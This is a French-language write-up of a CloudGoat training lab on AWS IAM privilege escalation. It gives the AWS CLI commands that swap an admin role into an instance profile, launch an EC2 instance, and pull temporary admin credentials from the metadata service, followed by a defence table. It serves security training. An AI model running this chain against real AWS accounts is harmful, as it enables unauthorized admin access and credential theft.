# Write-up — CloudGoat : IAM Privilege Escalation by Attachment

> **CloudGoat · Rhino Security Labs · Pilier 2 — Cloud Offensif AWS**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

[![AWS IAM](https://img.shields.io/badge/AWS-IAM%20PrivEsc-orange.svg)](https://aws.amazon.com/iam/)
[![CloudGoat](https://img.shields.io/badge/CloudGoat-iam__privesc__by__attachment-red.svg)](https://github.com/RhinoSecurityLabs/cloudgoat)
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Vulnérabilité :** IAM Privilege Escalation via PassRole + EC2
**Point de départ :** User `kerrigan` avec permissions EC2 limitées
**Impact :** Accès admin complet via credentials temporaires du rôle `cg-ec2-mighty-role`
**Technique :** Swap de rôle sur instance profile → EC2 launch → metadata service 169.254.169.254

---

## 2. Surface d'attaque

**Credentials initiaux :** user `kerrigan` — permissions limitées, AccessDenied sur les commandes IAM de base.

**Enumération depuis profil admin pour identifier les permissions de kerrigan :**

```bash
aws iam get-policy-version \
  --policy-arn arn:aws:iam::891612570273:policy/cg-kerrigan-policy \
  --version-id v1 --profile default
```

**Policy kerrigan — permissions critiques identifiées :**

```json
{
  "Action": [
    "iam:AddRoleToInstanceProfile",
    "iam:ListInstanceProfiles",
    "iam:ListRoles",
    "iam:PassRole",
    "iam:RemoveRoleFromInstanceProfile"
  ],
  "Effect": "Allow",
  "Resource": "*"
},
{
  "Action": [
    "ec2:RunInstances",
    "ec2:CreateKeyPair",
    "ec2:AssociateIamInstanceProfile",
    "ec2:DescribeInstances",
    "ec2:DescribeSubnets",
    "ec2:DescribeSecurityGroups"
  ],
  "Effect": "Allow",
  "Resource": "*"
}
```

**Vecteur identifié :** `iam:PassRole` + `ec2:RunInstances` = PassRole privesc via EC2.

> Screenshot : [docs/iam_privesc_1_roles.png1.png](docs/iam_privesc_1_roles.png1.png)

---

## 3. Chaîne d'exploitation

```
kerrigan
  │
  ├─ ListRoles → découvre cg-ec2-meek-role + cg-ec2-mighty-role
  ├─ ListInstanceProfiles → instance profile existant avec meek role
  │
  ├─ RemoveRoleFromInstanceProfile (meek → retiré)
  ├─ AddRoleToInstanceProfile (mighty → attaché)
  │
  ├─ CreateKeyPair → kerrigan-key.pem
  ├─ RunInstances (t3.micro + mighty instance profile)
  │
  └─ SSH → curl 169.254.169.254 → credentials mighty role (admin)
```

---

## 4. Payload — Commandes clés

**Étape 1 — Swap des rôles :**
```bash
aws iam remove-role-from-instance-profile \
  --instance-profile-name cg-ec2-meek-instance-profile-cgiditzkp4h6o8 \
  --role-name cg-ec2-meek-role-cgiditzkp4h6o8 \
  --profile kerrigan

aws iam add-role-to-instance-profile \
  --instance-profile-name cg-ec2-meek-instance-profile-cgiditzkp4h6o8 \
  --role-name cg-ec2-mighty-role-cgiditzkp4h6o8 \
  --profile kerrigan
```

**Étape 2 — Lancement EC2 avec mighty profile :**
```bash
aws ec2 run-instances \
  --image-id ami-03fdf597129d2144d \
  --instance-type t3.micro \
  --key-name kerrigan-key \
  --iam-instance-profile Name=cg-ec2-meek-instance-profile-cgiditzkp4h6o8 \
  --profile kerrigan
```

> Screenshot EC2 : [docs/iam_privesc_3_ec2.png](docs/iam_privesc_3_ec2.png)

**Étape 3 — Metadata service depuis l'EC2 :**
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# → cg-ec2-mighty-role-cgiditzkp4h6o8

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-mighty-role-cgiditzkp4h6o8
# → AccessKeyId + SecretAccessKey + Token (credentials temporaires admin)
```

> Screenshot metadata : [docs/iam_privesc_4_metadata.png](docs/iam_privesc_4_metadata.png)

---

## 5. Preuve de compromission

Avec les credentials du rôle mighty, accès admin complet confirmé :

```bash
aws iam list-users --profile mighty   # → tous les users du compte
aws iam list-roles --profile mighty   # → tous les rôles
```

> Screenshot accès admin : [docs/iam_privesc_5_solved1.png](docs/iam_privesc_5_solved1.png)

---

## 6. Défense

| Mesure | Mécanisme |
| --- | --- |
| **Restreindre PassRole** | Limiter `iam:PassRole` à des rôles spécifiques, jamais `Resource: *` |
| **Principe du moindre privilège** | kerrigan ne devrait pas avoir `ec2:RunInstances` + `iam:PassRole` ensemble |
| **IMDSv2 obligatoire** | Forcer IMDSv2 sur toutes les instances — requiert un token pour accéder au metadata service |
| **SCPs (Service Control Policies)** | Bloquer `iam:PassRole` sauf pour des rôles whitelistés via AWS Organizations |
| **CloudTrail** | Logger tous les appels IAM — `AddRoleToInstanceProfile` depuis un user non-admin doit alerter |

---

## 7. Reproductibilité

```
1. cloudgoat create iam_privesc_by_attachment
2. Configurer le profil kerrigan avec les credentials du start.txt
3. Enumérer : list-roles + list-instance-profiles
4. Swap : remove meek → add mighty sur l'instance profile
5. create-key-pair + run-instances avec le mighty instance profile
6. SSH → curl 169.254.169.254 → credentials temporaires
7. Configurer profil mighty → accès admin confirmé
8. cloudgoat destroy iam_privesc_by_attachment
```

---

## Résumé technique

| Élément | Valeur |
| --- | --- |
| Scénario | CloudGoat iam_privesc_by_attachment |
| Vecteur | PassRole + EC2 RunInstances → metadata service |
| Permission clé | `iam:PassRole` + `iam:AddRoleToInstanceProfile` |
| Credentials obtenus | Temporaires (STS) via IMDS — expiration ~6h |
| Impact | Accès admin complet au compte AWS |

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
